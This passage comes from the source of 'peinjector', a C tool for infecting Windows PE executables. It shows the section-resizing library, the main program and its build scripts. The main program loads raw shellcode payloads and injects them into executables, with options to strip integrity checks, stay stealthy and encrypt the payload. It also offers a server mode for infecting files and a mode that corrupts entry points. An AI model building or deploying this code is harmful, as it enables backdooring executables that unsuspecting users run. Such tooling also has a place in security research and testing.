  /* Increase at head */
  memmove(new_header_padding + size, new_header_padding, out->header_padding.memsize);
  memset(new_header_padding, 0, size);
  out->header_padding.mem = new_header_padding;
  out->header_padding.memsize += size;

  /* Fix SizeOfHeaders */
  if (out->optional_header_32.Magic == NT_OPTIONAL_32_MAGIC) {
    if (out->optional_header_32.SizeOfHeaders < (header_raw_end + out->header_padding.memsize)) {
      out->optional_header_32.SizeOfHeaders = header_raw_end + out->header_padding.memsize;
    }
  } else if (out->optional_header_64.Magic == NT_OPTIONAL_64_MAGIC) {
    if (out->optional_header_64.SizeOfHeaders < (header_raw_end + out->header_padding.memsize)) {
      out->optional_header_64.SizeOfHeaders = header_raw_end + out->header_padding.memsize;
    }
  }

  /* Fix section positions */
  if ((out->pe_header.NumberOfSections > 0) && (out->section_header != NULL)) {
    for (i = 0; i < out->pe_header.NumberOfSections; ++i) {
      out->section_header[i].PointerToRawData += size;
    }
  }

  /* Fix additional data positions */
  if ((out->additional_count > 0) && (out->additional_data != NULL)) {
    for (i = 0; i < out->additional_count; ++i) {
      out->additional_data[i].position += size;
    }
  }

  return true;
}

bool petool_resize_section(size_t section_index, size_t new_raw_size, size_t new_virtual_size, bool header_only,
    PEFILE *out) {

  uint32_t old_raw_size = 0;
  uint32_t diff = 0;
  bool shrink = false;
  bool raw_change = false;
  unsigned char *newmem = NULL;
  int i = 0;

  /* Default values (PE COFF Specification) */
  size_t file_alignment = NT_FILE_ALIGNMENT;

  /* No Section Headers*/
  if (out->section_header == NULL) {
    return false;
  }

  /* Section Index out of bounds */
  if (out->pe_header.NumberOfSections <= section_index) {
    return false;
  }

  /* Virtual Size won't fit */
  if ((out->pe_header.NumberOfSections < (section_index + 1))
      && ((out->section_header[section_index].VirtualAddress + new_virtual_size)
          > out->section_header[section_index + 1].VirtualAddress)) {
    return false;
  }

  /* Nothing to do */
  if (!(raw_change = (new_raw_size != out->section_header[section_index].SizeOfRawData))
      && out->section_header[section_index].Misc.VirtualSize == new_virtual_size) {
    return true;
  }

  /* Try to change raw size of section nested in another section, this won't work ... */
  if (raw_change) {
    for (i = 0; i < out->pe_header.NumberOfSections; ++i) {
      if ((section_index != i)
          && (out->section_header[i].PointerToRawData <= out->section_header[section_index].PointerToRawData)
          && ((out->section_header[i].PointerToRawData + out->section_header[i].SizeOfRawData)
              >= (out->section_header[section_index].PointerToRawData + out->section_header[section_index].SizeOfRawData))) {
        return false;
      }
    }
  }

  /* New Virtual Size */
  out->section_header[section_index].Misc.VirtualSize = new_virtual_size;

  /* Only needed if RawSize was changed */
  if (raw_change) {

    /* Save old raw size*/
    old_raw_size = out->section_header[section_index].SizeOfRawData;

    /* Try to load specific alignments */
    /* x86 */
    if ((out->optional_header_32.Magic == NT_OPTIONAL_32_MAGIC)
        && (out->pe_header.SizeOfOptionalHeader >= offsetof(OPTIONAL_HEADER_32, MajorOperatingSystemVersion))) {
      file_alignment = out->optional_header_32.FileAlignment;

      /* x64 */
    } else if (out->optional_header_64.Magic == NT_OPTIONAL_64_MAGIC
        && (out->pe_header.SizeOfOptionalHeader >= offsetof(OPTIONAL_HEADER_64, MajorOperatingSystemVersion))) {
      file_alignment = out->optional_header_64.FileAlignment;
    }

    /* Align new raw size */
    new_raw_size = __petool_align(new_raw_size, file_alignment);

    /* Set new RawSize */
    out->section_header[section_index].SizeOfRawData = new_raw_size;

    /* Get Size difference  */
    if (new_raw_size > old_raw_size) {
      diff = new_raw_size - old_raw_size;
      shrink = false;
    } else {
      diff = old_raw_size - new_raw_size;
      shrink = true;
    }

    /* Fix section offsets*/
    for (i = 0; i < out->pe_header.NumberOfSections; ++i) {
      if (out->section_header[i].PointerToRawData
          >= (out->section_header[section_index].PointerToRawData + old_raw_size)) {
        shrink ? (out->section_header[i].PointerToRawData -= diff) : (out->section_header[i].PointerToRawData += diff);
      }
    }

    /* Resize section memory */
    if (!header_only) {
      if (out->section_data == NULL) {
        return false;
      }

      /* Try resize */
      newmem = realloc(out->section_data[section_index].mem, new_raw_size);
      if (newmem == NULL) {
        return false;
      }

      /* Set new Memory */
      out->section_data[section_index].mem = newmem;
      out->section_data[section_index].memsize = new_raw_size;

      /* Fix additional data positions */
      if ((out->additional_count > 0) && (out->additional_data != NULL)) {
        for (i = 0; i < out->additional_count; ++i) {
          if (out->additional_data[i].position
              >= (out->section_header[section_index].PointerToRawData + old_raw_size)) {
            shrink ? (out->additional_data[i].position -= diff) : (out->additional_data[i].position += diff);
          }
        }
      }
    }
  }

  /* Adjust Optional Header*/
  __petool_adjust_optional_header(out);

  return true;
}

bool petool_add_section(char *name, size_t namesize, size_t characteristics, unsigned char *mem, size_t memsize,
bool header_only, PEFILE *out) {
  SECTION_HEADER *new_section_header = NULL;
  DATA_BLOB *new_section_data = NULL;
  size_t i;
  size_t last_section_rva = 0;
  size_t last_section_virtualsize = 0;
  size_t header_raw_end = out->dos_header.e_lfanew + sizeof(PE_HEADER) + out->pe_header.SizeOfOptionalHeader
      + out->pe_header.NumberOfSections * sizeof(SECTION_HEADER);

  /* Default values (PE COFF Specification) */
  size_t section_alignment = NT_SECTION_ALIGNMENT;
  size_t file_alignment = NT_FILE_ALIGNMENT;
  unsigned char *section_mem = NULL;
  size_t section_memsize = 0;
  size_t section_raw_pointer = 0;
  size_t section_rva;

  /* Try to load specific alignments */
  /* x86 */
  if ((out->optional_header_32.Magic == NT_OPTIONAL_32_MAGIC)
      && (out->pe_header.SizeOfOptionalHeader >= offsetof(OPTIONAL_HEADER_32, MajorOperatingSystemVersion))) {
    section_alignment = out->optional_header_32.SectionAlignment;
    file_alignment = out->optional_header_32.FileAlignment;
    last_section_rva = out->optional_header_32.BaseOfCode;

    /* x64 */
  } else if (out->optional_header_64.Magic == NT_OPTIONAL_64_MAGIC
      && (out->pe_header.SizeOfOptionalHeader >= offsetof(OPTIONAL_HEADER_64, MajorOperatingSystemVersion))) {
    section_alignment = out->optional_header_64.SectionAlignment;
    file_alignment = out->optional_header_64.FileAlignment;
    last_section_rva = out->optional_header_64.BaseOfCode;
  }

  /* Increase header padding till the new header fits */
  while (out->header_padding.memsize < sizeof(SECTION_HEADER)) {
    if (!__petool_increase_header_padding(file_alignment, out)) {

      /* Something went wrong*/
      return false;
    }
  }

  /* Move padding */
  memmove(out->header_padding.mem, out->header_padding.mem + sizeof(SECTION_HEADER),
      out->header_padding.memsize - sizeof(SECTION_HEADER));
  out->header_padding.memsize -= sizeof(SECTION_HEADER);

  /* Try find position of last section */
  if ((out->pe_header.NumberOfSections > 0) && (out->section_header != NULL)) {
    last_section_rva = out->section_header[out->pe_header.NumberOfSections - 1].VirtualAddress;
    last_section_virtualsize = out->section_header[out->pe_header.NumberOfSections - 1].Misc.VirtualSize;

    /* Sections can be nested inside other sections */
    for (i = 0; i < out->pe_header.NumberOfSections; ++i) {
      section_raw_pointer = MAX(section_raw_pointer,
          out->section_header[i].PointerToRawData + out->section_header[i].SizeOfRawData);
    }

  } else {
    section_raw_pointer = header_raw_end + out->header_padding.memsize;
  }

  /* Resize holder structures */
  out->pe_header.NumberOfSections++;
  new_section_header = realloc(out->section_header, out->pe_header.NumberOfSections * sizeof(SECTION_HEADER));
  /* Couldn't allocate memory */
  if (new_section_header == NULL) {
    return false;
  }
  out->section_header = new_section_header;

  if (!header_only) {
    new_section_data = realloc(out->section_data, out->pe_header.NumberOfSections * sizeof(DATA_BLOB));
    /* Couldn't allocate memory */
    if (new_section_data == NULL) {
      return false;
    }
    out->section_data = new_section_data;
  }

  /* Calculate padded raw size & relative virtual address */
  section_memsize = __petool_align(memsize, file_alignment);
  section_rva = __petool_align(last_section_rva + last_section_virtualsize, section_alignment);

  /* Header only, don't modify data */
  if (!header_only) {
    /* Allocate new section memory */
    section_mem = malloc(section_memsize);
    /* Couldn't allocate memory */
    if (section_mem == NULL) {
      return false;
    }

    /* Copy memory to section memory and clear rest */
    if (mem != NULL) {
      memcpy(section_mem, mem, memsize);
      memset(section_mem + memsize, 0, section_memsize - memsize);
    } else {
      memset(section_mem, 0, section_memsize);
    }

    /* Store section data */
    out->section_data[out->pe_header.NumberOfSections - 1].mem = section_mem;
    out->section_data[out->pe_header.NumberOfSections - 1].memsize = section_memsize;

  }

  /* New Section Header */
  memset(&out->section_header[out->pe_header.NumberOfSections - 1], 0, sizeof(SECTION_HEADER));
  out->section_header[out->pe_header.NumberOfSections - 1].PointerToRawData = section_raw_pointer;
  out->section_header[out->pe_header.NumberOfSections - 1].SizeOfRawData = section_memsize;
  out->section_header[out->pe_header.NumberOfSections - 1].VirtualAddress = section_rva;
  out->section_header[out->pe_header.NumberOfSections - 1].Misc.VirtualSize = memsize;
  out->section_header[out->pe_header.NumberOfSections - 1].Characteristics = characteristics;
  if (name != NULL) {
    memcpy(out->section_header[out->pe_header.NumberOfSections - 1].Name, name, MIN(NT_SHORT_NAME_LEN, namesize));
  }

  /* Header only, don't modify data */
  if (!header_only) {
    /* Fix additional data positions */
    if ((out->additional_count > 0) && (out->additional_data != NULL)) {
      for (i = 0; i < out->additional_count; ++i) {
        if (out->additional_data[i].position
            == out->section_header[out->pe_header.NumberOfSections - 1].PointerToRawData) {
          out->additional_data[i].position += out->section_header[out->pe_header.NumberOfSections - 1].SizeOfRawData;
          break;
        }
      }
    }
  }

  /* Adjust Optional Header */
  __petool_adjust_optional_header(out);

  return true;
}

```

`peinjector/libpetool.h`:

```h
/**
 * \file   libpetool.h
 * \author A.A.
 * \brief  Applies complex operations on a given PE FILE
 */

#ifndef LIBPETOOL_H_
#define LIBPETOOL_H_

#include "libpefile.h"

/**
 * Tries to resize an existing section
 *
 * \param section_index    Index of section to resize
 * \param new_raw_size     New RawSize of section
 * \param new_virtual_size New VirtualSize of section
 * \param header_only      Only modifies header
 * \param out              PE File where the section will be resized
 *
 * \return true on success, false otherwise
 */
bool petool_resize_section(size_t section_index, size_t new_raw_size, size_t new_virtual_size, bool header_only,
    PEFILE *out);

/**
 * Tries to insert a new section into a given PE File
 *
 * \param name            Name of new section
 * \param namesize        Size of name
 * \param characteristics Characteristics of new section
 * \param mem             Memory used for new section. If NULL, memsize zeros will be used
 * \param memsize         Memory size of new section
 * \param header_only     Only modifies header
 * \param out             PE File where the section will be added
 *
 * \return true on success, false otherwise
 */
bool petool_add_section(char *name, size_t namesize, size_t characteristics, unsigned char *mem, size_t memsize,
    bool header_only, PEFILE *out);

#endif /* LIBPETOOL_H_ */

```

`peinjector/peinjector.c`:

```c
/**
 * \file   peinjector.c
 * \author A.A.
 * \brief  PE infection test tool
 */

#include "libpetool.h"
#include "libpeinfect.h"
#include "libpeserver.h"
#include "3rdparty/ini/minIni.h"
#include <stdio.h>
#include <stdlib.h>

#ifdef _WIN32 /* Windows/Linux Switch */
#include "windows.h"
#endif

/* Config Names */
#define CONFIG_FILE      "config.ini"
#define PAYLOAD_FILE_X86 "payload_x86.bin"
#define PAYLOAD_FILE_X64 "payload_x64.bin"

/**
 * Reads binary file
 *
 * \param file    File to read
 * \param memsize Store size of file
 *
 * \return file memory if success, NULL otherwise
 * */
static inline unsigned char* __read_file(char *file, size_t *memsize) {
  unsigned char *file_mem;
  /* Open file */
  FILE *fh = fopen(file, "rb");

  if (fh != NULL) {
    /* Get file size and allocate buffer */
    fseek(fh, 0L, SEEK_END);
    size_t size = ftell(fh);
    size_t size_read = 0;
    rewind(fh);
    file_mem = malloc(size);

    if (file_mem != NULL) {
      /* Load file into buffer */
      size_read = fread(file_mem, size, 1, fh);
      fclose(fh);
      fh = NULL;

      if (size_read != 1) {
        free(file_mem);
        file_mem = NULL;
      }
      
      /* Return buffer */
      *memsize = size;
      return file_mem;
    }
    /* Close file (if memory allocation has failed) */
    if (fh != NULL) {
      fclose(fh);
    }
  }

  return NULL;
}

/**
 * Configures PEINFCT
 *
 * \param infect PEINFECT to configure
 *
 * */
static inline void __load_config(PEINFECT *infect) {
  unsigned char *test_code_x86;
  size_t test_codesize_x86 = 0;
  unsigned char *test_code_x64;
  size_t test_codesize_x64 = 0;
  PEINFECT_METHOD methods = 0;
  bool random_section_name = false;
  size_t section_namesize = 0;
  char section_name[NT_SHORT_NAME_LEN] = { 0 };

  /* Load integrity options */
  peinfect_set_removeintegrity(ini_getl("integrity", "remove_integrity_checks", true, CONFIG_FILE), infect);
  peinfect_set_trystaystealth(ini_getl("integrity", "try_stay_stealth", true, CONFIG_FILE), infect);

  /* Load statistics options */
  peinfect_set_infectcounter(ini_getl("statistics", "infection_counter_x86", 0, CONFIG_FILE), false, infect);
  peinfect_set_infectcounter(ini_getl("statistics", "infection_counter_x64", 0, CONFIG_FILE), true, infect);

  /* Load methods */
  methods |= ini_getl("methods", "method_alignment", true, CONFIG_FILE) ? METHOD_ALIGNMENT : 0;
  methods |= ini_getl("methods", "method_alignment_resize", true, CONFIG_FILE) ? METHOD_ALIGNMENT_RESIZE : 0;
  methods |= ini_getl("methods", "method_new_section", true, CONFIG_FILE) ? METHOD_NEW_SECTION : 0;
  methods |= ini_getl("methods", "method_change_flags", true, CONFIG_FILE) ? METHOD_CHANGE_FLAGS : 0;
  methods |= ini_getl("methods", "method_cross_section_jump", false, CONFIG_FILE) ? METHOD_CROSS_SECTION_JUMP : 0;
  peinfect_set_methods(methods, infect);

  /* Cross section jump iterations */
  peinfect_set_jumpiterations(ini_getl("methods", "method_cross_section_jump_iterations", 1, CONFIG_FILE), infect);

  /* Encryption */
  peinfect_set_encrypt(ini_getl("methods", "encrypt", true, CONFIG_FILE), infect);
  peinfect_set_encryptiterations(ini_getl("methods", "encrypt_iterations", 1, CONFIG_FILE), infect);

  /* New Section Name */
  peinfect_set_sectionname(NULL, 0, (random_section_name = ini_getl("name", "section_name_random", true, CONFIG_FILE)),
      infect);
  if (!random_section_name) {
    section_namesize = ini_gets("name", "section_name", "", section_name, NT_SHORT_NAME_LEN, CONFIG_FILE);
    peinfect_set_sectionname(section_name, section_namesize, false, infect);
  }

  /* Statistics */
  peinfect_set_infectcounter(ini_getl("statistics", "infection_counter_x86", 0, CONFIG_FILE), false, infect);
  peinfect_set_infectcounter(ini_getl("statistics", "infection_counter_x64", 0, CONFIG_FILE), true, infect);

  /* Load shellcode */
  test_code_x86 = __read_file(PAYLOAD_FILE_X86, &test_codesize_x86);
  test_code_x64 = __read_file(PAYLOAD_FILE_X64, &test_codesize_x64);

  /* Set shellcode */
  peinfect_set_shellcode(test_code_x86, test_codesize_x86, false, infect);
  peinfect_set_shellcode(test_code_x64, test_codesize_x64, true, infect);

  /* Free temp. Buffer */
  if (test_code_x86 != NULL) {
    free(test_code_x86);
  }
  if (test_code_x64 != NULL) {
    free(test_code_x64);
  }
}

/**
 * Prints PEFILE info
 *
 * \param in PEFILE to print
 *
 * */
static inline void __print_info(PEFILE *in) {
  int i = 0;

  printf("# PE Header #\n");
  printf("Signature:                   %08x\n", in->pe_header.Signature);
  printf("Machine:                     %04x\n", in->pe_header.Machine);
  printf("NumberofSections:            %04x\n", in->pe_header.NumberOfSections);
  printf("TimeDateStamp:               %08x\n", in->pe_header.TimeDateStamp);
  printf("PointerToSymbolTable:        %08x\n", in->pe_header.PointerToSymbolTable);
  printf("NumberOfSymbols:             %08x\n", in->pe_header.NumberOfSymbols);
  printf("SizeOfOptionalHeader:        %04x\n", in->pe_header.SizeOfOptionalHeader);
  printf("Characteristics:             %04x\n", in->pe_header.Characteristics);
  printf("\n");

  if (in->pe_header.SizeOfOptionalHeader) {
    if (in->optional_header_32.Magic == NT_OPTIONAL_32_MAGIC) {
      printf("# Optional Header (32 Bit) #\n");
      printf("Magic:                       %04x\n", in->optional_header_32.Magic);
      printf("MajorLinkerVersion:          %02x\n", in->optional_header_32.MajorLinkerVersion);
      printf("MinorLinkerVersion:          %02x\n", in->optional_header_32.MinorLinkerVersion);
      printf("SizeOfCode:                  %08x\n", in->optional_header_32.SizeOfCode);
      printf("SizeOfInitializedData:       %08x\n", in->optional_header_32.SizeOfInitializedData);
      printf("SizeOfUninitializedData:     %08x\n", in->optional_header_32.SizeOfUninitializedData);
      printf("AddressOfEntryPoint:         %08x\n", in->optional_header_32.AddressOfEntryPoint);
      printf("BaseOfCode:                  %08x\n", in->optional_header_32.BaseOfCode);
      printf("BaseOfData:                  %08x\n", in->optional_header_32.BaseOfData);
      printf("ImageBase:                   %08x\n", in->optional_header_32.ImageBase);
      printf("SectionAlignment:            %08x\n", in->optional_header_32.SectionAlignment);
      printf("FileAlignment:               %08x\n", in->optional_header_32.FileAlignment);
      printf("MajorOperatingSystemVersion: %04x\n", in->optional_header_32.MajorOperatingSystemVersion);
      printf("MinorOperatingSystemVersion: %04x\n", in->optional_header_32.MinorOperatingSystemVersion);
      printf("MajorImageVersion:           %04x\n", in->optional_header_32.MajorImageVersion);
      printf("MinorImageVersion:           %04x\n", in->optional_header_32.MinorImageVersion);
      printf("MajorSubsystemVersion:       %04x\n", in->optional_header_32.MajorSubsystemVersion);
      printf("MinorSubsystemVersion:       %04x\n", in->optional_header_32.MinorSubsystemVersion);
      printf("Win32VersionValue:           %08x\n", in->optional_header_32.Win32VersionValue);
      printf("SizeOfImage:                 %08x\n", in->optional_header_32.SizeOfImage);
      printf("SizeOfHeaders:               %08x\n", in->optional_header_32.SizeOfHeaders);
      printf("CheckSum:                    %08x\n", in->optional_header_32.CheckSum);
      printf("Subsystem:                   %04x\n", in->optional_header_32.Subsystem);
      printf("DllCharacteristics:          %04x\n", in->optional_header_32.DllCharacteristics);
      printf("SizeOfStackReserve:          %08x\n", in->optional_header_32.SizeOfStackReserve);
      printf("SizeOfStackCommit:           %08x\n", in->optional_header_32.SizeOfStackCommit);
      printf("SizeOfHeapReserve:           %08x\n", in->optional_header_32.SizeOfHeapReserve);
      printf("SizeOfHeapCommit:            %08x\n", in->optional_header_32.SizeOfHeapCommit);
      printf("LoaderFlags:                 %08x\n", in->optional_header_32.LoaderFlags);
      printf("NumberOfRvaAndSizes:         %08x\n", in->optional_header_32.NumberOfRvaAndSizes);

    } else if (in->optional_header_64.Magic == NT_OPTIONAL_64_MAGIC) {
      printf("# Optional Header (64 Bit) #\n");

      printf("Magic:                       %04x\n", in->optional_header_64.Magic);
      printf("MajorLinkerVersion:          %02x\n", in->optional_header_64.MajorLinkerVersion);
      printf("MinorLinkerVersion:          %02x\n", in->optional_header_64.MinorLinkerVersion);
      printf("SizeOfCode:                  %08x\n", in->optional_header_64.SizeOfCode);
      printf("SizeOfInitializedData:       %08x\n", in->optional_header_64.SizeOfInitializedData);
      printf("SizeOfUninitializedData:     %08x\n", in->optional_header_64.SizeOfUninitializedData);
      printf("AddressOfEntryPoint:         %08x\n", in->optional_header_64.AddressOfEntryPoint);
      printf("BaseOfCode:                  %08x\n", in->optional_header_64.BaseOfCode);
      printf("ImageBase:                   %016x\n", (uint32_t) in->optional_header_64.ImageBase);
      printf("SectionAlignment:            %08x\n", in->optional_header_64.SectionAlignment);
      printf("FileAlignment:               %08x\n", in->optional_header_64.FileAlignment);
      printf("MajorOperatingSystemVersion: %04x\n", in->optional_header_64.MajorOperatingSystemVersion);
      printf("MinorOperatingSystemVersion: %04x\n", in->optional_header_64.MinorOperatingSystemVersion);
      printf("MajorImageVersion:           %04x\n", in->optional_header_64.MajorImageVersion);
      printf("MinorImageVersion:           %04x\n", in->optional_header_64.MinorImageVersion);
      printf("MajorSubsystemVersion:       %04x\n", in->optional_header_64.MajorSubsystemVersion);
      printf("MinorSubsystemVersion:       %04x\n", in->optional_header_64.MinorSubsystemVersion);
      printf("Win32VersionValue:           %08x\n", in->optional_header_64.Win32VersionValue);
      printf("SizeOfImage:                 %08x\n", in->optional_header_64.SizeOfImage);
      printf("SizeOfHeaders:               %08x\n", in->optional_header_64.SizeOfHeaders);
      printf("CheckSum:                    %08x\n", in->optional_header_64.CheckSum);
      printf("Subsystem:                   %04x\n", in->optional_header_64.Subsystem);
      printf("DllCharacteristics:          %04x\n", in->optional_header_64.DllCharacteristics);
      printf("SizeOfStackReserve:          %016x\n", (uint32_t) in->optional_header_64.SizeOfStackReserve);
      printf("SizeOfStackCommit:           %016x\n", (uint32_t) in->optional_header_64.SizeOfStackCommit);
      printf("SizeOfHeapReserve:           %016x\n", (uint32_t) in->optional_header_64.SizeOfHeapReserve);
      printf("SizeOfHeapCommit:            %016x\n", (uint32_t) in->optional_header_64.SizeOfHeapCommit);
      printf("LoaderFlags:                 %08x\n", in->optional_header_64.LoaderFlags);
      printf("NumberOfRvaAndSizes:         %08x\n", in->optional_header_64.NumberOfRvaAndSizes);
    }
    printf("\n");
  }

  if (in->pe_header.NumberOfSections) {
    printf("# Sections #\n");
    printf("Name     VirtualSize VirtualAddr. SizeofRawData PointerToRawData Characteristics\n");
    for (i = 0; i < in->pe_header.NumberOfSections; ++i) {
      printf("%-8.*s %08x    %08x     %08x      %08x         %08x\n", 8, in->section_header[i].Name,
          in->section_header[i].Misc.VirtualSize, in->section_header[i].VirtualAddress,
          in->section_header[i].SizeOfRawData, in->section_header[i].PointerToRawData,
          in->section_header[i].Characteristics);
    }
    printf("\n");
  }

}

/**
 * Prints usage information
 */
static void __print_usage() {
  printf(
      " <<< Usage >>> \n\
  peinjector --info file\n\
  peinjector --infect file\n\
  peinjector --patch file (Debug Output)\n\
  peinjector --server\n\
  peinjector --accidentally-forget-entry-point file\n");
}

/**
 * Main Routine
 *
 * \param pcount Number of parameter given
 * \param params Parameters given
 *
 * \returns 0
 */
int main(int pcount, char **params) {
  bool restart_server = true;

  /* Server */
  PESERVER server;
  /* Server config */
  PECONFIG config;
  peserver_init_config(CONFIG_FILE, PAYLOAD_FILE_X86, PAYLOAD_FILE_X64, &config);

  /* PE File */
  PEFILE mype;
  pefile_init(&mype);

  PEFILE_READ_OPTIONS read_options;
  read_options.header_only = true;

  /* PE Inject */
  PEINFECT infect;
  peinfect_init(&infect);

  /* Check Params */
  if (pcount == 3) {

    /* Statically infect file */
    if (strcmp("--infect", params[1]) == 0) {
      printf(" <<< Infect >>> \n");

      __load_config(&infect);
      if (peinfect_infect_full_file(params[2], &infect, params[2])) {
        printf("Success\n");
      } else {
        printf("Error\n");
      }

      /* Show patch parts (debug) */
    } else if (strcmp("--patch", params[1]) == 0) {
      printf(" <<< Try patch >>> \n");

      __load_config(&infect);
      if (peinfect_infect_patch_file(params[2], &infect)) {
        printf("Success\n");
      } else {
        printf("Error\n");
      }

      /* Show Info */
    } else if (strcmp("--info", params[1]) == 0) {
      printf(" <<< Info >>> \n");

      if (pefile_read_file(params[2], &read_options, &mype)) {
        __print_info(&mype);
      } else {
        printf("Error\n");
      }

    } else if (strcmp("--accidentally-forget-entry-point", params[1]) == 0) {
      printf(" <<< Oooops ... >>> \n");
      printf("When I'm drunk I always fuck up PE files entry points ...\n");

      if (pefile_read_file(params[2], NULL, &mype)) {
        mype.optional_header_32.AddressOfEntryPoint = 0;
        mype.optional_header_64.AddressOfEntryPoint = 0;
        if (pefile_write_file(&mype, NULL, params[2])) {
          printf("Success\n");
        } else {
          printf("Error writing file\n");
        }

      } else {
        printf("Error parsing file\n");
      }
      /* Invalid parameter combination */
    } else {
      __print_usage();
    }

  } else if ((pcount == 2) && (strcmp("--server", params[1]) == 0)) {

    /* Restart loop */
    restart_server = true;
    while (restart_server) {
      /* Init Server */
      __load_config(&infect);
      if (peserver_init(&infect, &config, &server)) {
        /* Wait for termination signal */
        restart_server = peserver_wait(&server);

        /* Frees the server */
        peserver_free(&server);

      } else {
        /* Couldn't (re)start server, exit */
        restart_server = false;
      }
    }

    /*Frees config*/
    peserver_free_config(&config);

    /* Invalid parameter combination */
  } else {
    __print_usage();
  }

  /* Free PEFILE & PEINFECT */
  pefile_free(&mype);
  peinfect_free(&infect);

  return 0;
}

```

`peinjector/peinjector_make.bat`:

```bat
@echo off

REM Make build directory
rmdir /s /q build
mkdir build
cd build

REM build executable 
gcc -O3 -Wall -c -o libpetool.o ..\libpetool.c
gcc -O3 -Wall -c -o libpefile.o ..\libpefile.c 
gcc -O3 -Wall -c -o libpeserver.o ..\libpeserver.c 
gcc -O3 -Wall -c -o peinjector.o ..\peinjector.c 
gcc -O3 -Wall -c -o libpeinfect.o ..\libpeinfect.c 
gcc -O3 -Wall -c -o libpeinfect_obfuscator.o ..\libpeinfect_obfuscator.c 
gcc -O3 -Wall -c -o libpeprotocol.o ..\libpeprotocol.c 
gcc -O3 -Wall -c -o minIni.o ..\3rdparty\ini\minIni.c 
gcc -s -o peinjector.exe peinjector.o libpetool.o libpeserver.o libpeprotocol.o minIni.o libpeinfect.o libpeinfect_obfuscator.o libpefile.o -lpthread -lws2_32

REM clean up
del *.o
cd ..
```

`peinjector/peinjector_make.sh`:

```sh
#!/bin/sh

# peinjector build script
# Author: A.A.

# make build directory
rm -rf ./build
mkdir ./build
cd ./build

# build executable
gcc -O3 -Wall -c -o libpetool.o ../libpetool.c
gcc -O3 -Wall -c -o libpefile.o ../libpefile.c
gcc -O3 -Wall -c -o libpeserver.o ../libpeserver.c
gcc -O3 -Wall -c -o peinjector.o ../peinjector.c
gcc -O3 -Wall -c -o libpeinfect.o ../libpeinfect.c
gcc -O3 -Wall -c -o libpeinfect_obfuscator.o ../libpeinfect_obfuscator.c 
gcc -O3 -Wall -c -o libpeprotocol.o ../libpeprotocol.c 
gcc -O3 -Wall -c -o minIni.o ../3rdparty/ini/minIni.c
gcc -s -o peinjector peinjector.o libpetool.o libpeserver.o libpeprotocol.o minIni.o libpeinfect.o libpeinfect_obfuscator.o libpefile.o -lpthread

# make executable
chmod +x ./peinjector

# clean up
rm -rf ./*.o

exit 0
```